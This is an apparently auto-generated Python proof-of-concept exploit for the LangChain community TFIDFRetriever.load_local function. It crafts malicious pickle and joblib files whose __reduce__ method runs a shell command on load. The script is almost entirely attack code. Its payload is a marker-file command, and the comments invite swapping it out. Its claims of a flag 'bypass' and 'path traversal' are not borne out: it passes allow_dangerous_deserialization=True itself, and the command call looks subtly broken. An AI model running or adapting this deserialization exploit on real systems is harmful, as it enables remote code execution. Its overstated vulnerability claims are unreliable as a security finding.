#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE
Vulnerability: load_local uses joblib.load and pickle.load on attacker-controlled paths
with a bypassable allow_dangerous_deserialization flag.

This PoC demonstrates:
1. Creating a malicious .joblib file that executes a benign command
2. Using path traversal to place it in a location load_local will read
3. Triggering the vulnerable function with allow_dangerous_deserialization=True

WARNING: For educational/authorized testing only. Use responsibly.
"""

import os
import sys
import tempfile
import pickle
import subprocess
from pathlib import Path

# ===== CONFIGURATION =====
# Target the local installation of langchain-community-only
# In a real scenario, this would be a remote endpoint
TARGET_DIR = "/tmp/langchain-community-only"

# Benign payload - creates a marker file to prove RCE
# Change to something else for testing, but keep it safe
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"

# ===== EXPLOIT PREPARATION =====

def create_malicious_joblib(payload_cmd):
    """
    Create a malicious .joblib file that executes a command when loaded.
    joblib.load uses pickle under the hood, so we craft a pickle payload.
    """
    class MaliciousPayload:
        def __reduce__(self):
            # Return a callable and its arguments to execute during unpickling
            return (subprocess.check_output, (payload_cmd,))
    
    # Create the malicious object
    malicious_obj = MaliciousPayload()
    
    # Serialize it using pickle (joblib uses pickle internally)
    payload_bytes = pickle.dumps(malicious_obj)
    return payload_bytes

def create_malicious_pkl(payload_cmd):
    """
    Create a malicious .pkl file that executes a command when loaded.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (subprocess.check_output, (payload_cmd,))
    
    malicious_obj = MaliciousPayload()
    payload_bytes = pickle.dumps(malicious_obj)
    return payload_bytes

def setup_exploit_environment():
    """
    Set up the exploit by creating malicious files in a location
    that can be reached via path traversal.
    """
    print("[*] Setting up exploit environment...")
    
    # Create a temporary directory for our malicious files
    exploit_dir = tempfile.mkdtemp(prefix="exploit_")
    print(f"[+] Created exploit directory: {exploit_dir}")
    
    # Create malicious .joblib file
    joblib_payload = create_malicious_joblib(PAYLOAD_COMMAND)
    joblib_path = Path(exploit_dir) / "malicious.joblib"
    with open(joblib_path, "wb") as f:
        f.write(joblib_payload)
    print(f"[+] Created malicious .joblib file: {joblib_path}")
    
    # Create malicious .pkl file (also needed by load_local)
    pkl_payload = create_malicious_pkl(PAYLOAD_COMMAND)
    pkl_path = Path(exploit_dir) / "malicious.pkl"
    with open(pkl_path, "wb") as f:
        f.write(pkl_payload)
    print(f"[+] Created malicious .pkl file: {pkl_path}")
    
    return exploit_dir

def trigger_exploit(exploit_dir):
    """
    Trigger the vulnerable load_local function with our malicious files.
    Uses path traversal to point to our exploit directory.
    """
    print("\n[*] Attempting to trigger RCE via load_local...")
    
    # We need to import the vulnerable function
    # Add the target directory to sys.path if needed
    if TARGET_DIR not in sys.path:
        sys.path.insert(0, TARGET_DIR)
    
    try:
        from langchain_community.retrievers.tfidf import TFIDFRetriever
        
        # Use path traversal to reach our malicious files
        # The function constructs: Path(folder_path) / f"{file_name}.joblib"
        # We can use absolute path or relative path with '..'
        
        # Using absolute path to our exploit directory
        folder_path = exploit_dir
        file_name = "malicious"  # Will load malicious.joblib and malicious.pkl
        
        print(f"[*] Calling load_local with:")
        print(f"    folder_path = {folder_path}")
        print(f"    file_name = {file_name}")
        print(f"    allow_dangerous_deserialization = True")
        
        # This should trigger the RCE
        result = TFIDFRetriever.load_local(
            folder_path=folder_path,
            file_name=file_name,
            allow_dangerous_deserialization=True
        )
        
        print(f"[+] load_local returned: {result}")
        
    except Exception as e:
        print(f"[!] Error during exploit: {e}")
        # Even if the function fails, the payload may have executed
        # during the deserialization attempt

def verify_exploit():
    """
    Check if the payload command was executed successfully.
    """
    print("\n[*] Verifying exploit success...")
    
    # Check for the marker file created by our payload
    marker_file = Path("/tmp/poc_success.txt")
    if marker_file.exists():
        print("[+] SUCCESS! Marker file exists: /tmp/poc_success.txt")
        print("[+] RCE achieved via malicious deserialization!")
        # Clean up the marker
        marker_file.unlink()
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False

def cleanup(exploit_dir):
    """
    Clean up temporary files.
    """
    print("\n[*] Cleaning up...")
    import shutil
    if Path(exploit_dir).exists():
        shutil.rmtree(exploit_dir)
        print(f"[+] Removed exploit directory: {exploit_dir}")

def main():
    """
    Main exploit flow.
    """
    print("=" * 60)
    print("PoC: langchain-community-only RCE via load_local")
    print("=" * 60)
    print()
    
    # Step 1: Create malicious files
    exploit_dir = setup_exploit_environment()
    
    # Step 2: Trigger the exploit
    trigger_exploit(exploit_dir)
    
    # Step 3: Verify
    success = verify_exploit()
    
    # Step 4: Cleanup
    cleanup(exploit_dir)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed. Check the error messages above.")
        sys.exit(1)

if __name__ == "__main__":
    main()
